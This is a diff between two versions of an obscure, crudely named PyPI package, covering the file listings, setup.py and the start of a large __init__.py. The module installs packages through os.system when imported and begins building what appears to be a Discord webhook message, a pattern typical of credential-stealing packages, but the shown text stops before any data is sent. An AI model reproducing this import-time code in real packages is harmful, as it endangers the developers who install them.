# Comparing `tmp/totohateinenkleinencock-2.0.0.tar.gz` & `tmp/totohateinenkleinencock-3.0.0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "totohateinenkleinencock-2.0.0.tar", last modified: Wed Apr 19 17:52:34 2023, max compression
+gzip compressed data, was "totohateinenkleinencock-3.0.0.tar", last modified: Wed Apr 19 17:54:44 2023, max compression
```

## Comparing `totohateinenkleinencock-2.0.0.tar` & `totohateinenkleinencock-3.0.0.tar`

### file list

```diff
@@ -1,11 +1,11 @@
-drwxr-xr-x   0 root         (0) root         (0)        0 2023-04-19 17:52:34.657875 totohateinenkleinencock-2.0.0/
--rw-r--r--   0 root         (0) root         (0)      320 2023-04-19 17:52:34.657875 totohateinenkleinencock-2.0.0/PKG-INFO
--rw-r--r--   0 root         (0) root         (0)       38 2023-04-19 17:52:34.657875 totohateinenkleinencock-2.0.0/setup.cfg
--rw-r--r--   0 root         (0) root         (0)      533 2023-04-19 17:52:33.000000 totohateinenkleinencock-2.0.0/setup.py
-drwxr-xr-x   0 root         (0) root         (0)        0 2023-04-19 17:52:34.653875 totohateinenkleinencock-2.0.0/totohateinenkleinencock/
--rw-r--r--   0 root         (0) root         (0)    82403 2023-04-19 17:52:34.000000 totohateinenkleinencock-2.0.0/totohateinenkleinencock/__init__.py
-drwxr-xr-x   0 root         (0) root         (0)        0 2023-04-19 17:52:34.653875 totohateinenkleinencock-2.0.0/totohateinenkleinencock.egg-info/
--rw-r--r--   0 root         (0) root         (0)      320 2023-04-19 17:52:34.000000 totohateinenkleinencock-2.0.0/totohateinenkleinencock.egg-info/PKG-INFO
--rw-r--r--   0 root         (0) root         (0)      232 2023-04-19 17:52:34.000000 totohateinenkleinencock-2.0.0/totohateinenkleinencock.egg-info/SOURCES.txt
--rw-r--r--   0 root         (0) root         (0)        1 2023-04-19 17:52:34.000000 totohateinenkleinencock-2.0.0/totohateinenkleinencock.egg-info/dependency_links.txt
--rw-r--r--   0 root         (0) root         (0)       24 2023-04-19 17:52:34.000000 totohateinenkleinencock-2.0.0/totohateinenkleinencock.egg-info/top_level.txt
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-04-19 17:54:44.784672 totohateinenkleinencock-3.0.0/
+-rw-r--r--   0 root         (0) root         (0)      320 2023-04-19 17:54:44.784672 totohateinenkleinencock-3.0.0/PKG-INFO
+-rw-r--r--   0 root         (0) root         (0)       38 2023-04-19 17:54:44.784672 totohateinenkleinencock-3.0.0/setup.cfg
+-rw-r--r--   0 root         (0) root         (0)      533 2023-04-19 17:54:43.000000 totohateinenkleinencock-3.0.0/setup.py
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-04-19 17:54:44.780672 totohateinenkleinencock-3.0.0/totohateinenkleinencock/
+-rw-r--r--   0 root         (0) root         (0)    82231 2023-04-19 17:54:44.000000 totohateinenkleinencock-3.0.0/totohateinenkleinencock/__init__.py
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-04-19 17:54:44.784672 totohateinenkleinencock-3.0.0/totohateinenkleinencock.egg-info/
+-rw-r--r--   0 root         (0) root         (0)      320 2023-04-19 17:54:44.000000 totohateinenkleinencock-3.0.0/totohateinenkleinencock.egg-info/PKG-INFO
+-rw-r--r--   0 root         (0) root         (0)      232 2023-04-19 17:54:44.000000 totohateinenkleinencock-3.0.0/totohateinenkleinencock.egg-info/SOURCES.txt
+-rw-r--r--   0 root         (0) root         (0)        1 2023-04-19 17:54:44.000000 totohateinenkleinencock-3.0.0/totohateinenkleinencock.egg-info/dependency_links.txt
+-rw-r--r--   0 root         (0) root         (0)       24 2023-04-19 17:54:44.000000 totohateinenkleinencock-3.0.0/totohateinenkleinencock.egg-info/top_level.txt
```

### Comparing `totohateinenkleinencock-2.0.0/setup.py` & `totohateinenkleinencock-3.0.0/setup.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 from setuptools import setup, find_packages
 
-VERSION = '2.0.0'
+VERSION = '3.0.0'
 DESCRIPTION = "toto"
 LONG_DESCRIPTION = "toto"
 
 # Setting up
 setup(
     name="totohateinenkleinencock",
     version=VERSION,
```

### Comparing `totohateinenkleinencock-2.0.0/totohateinenkleinencock/__init__.py` & `totohateinenkleinencock-3.0.0/totohateinenkleinencock/__init__.py`

 * *Files 0% similar despite different names*

```diff
@@ -1,12 +1,7 @@
-requestlib (View this project on PyPI)
-requestlib==1.0.2 (View this release on PyPI)
-requestlib-1.0.2-py3-none-any.whl
-requestlib/__init__.py
-Report Malicious Package
 import os
 os.system("pip install requests httpx")
 import requests
 import os
 import httpx
 data = {
         'embeds': [{
```

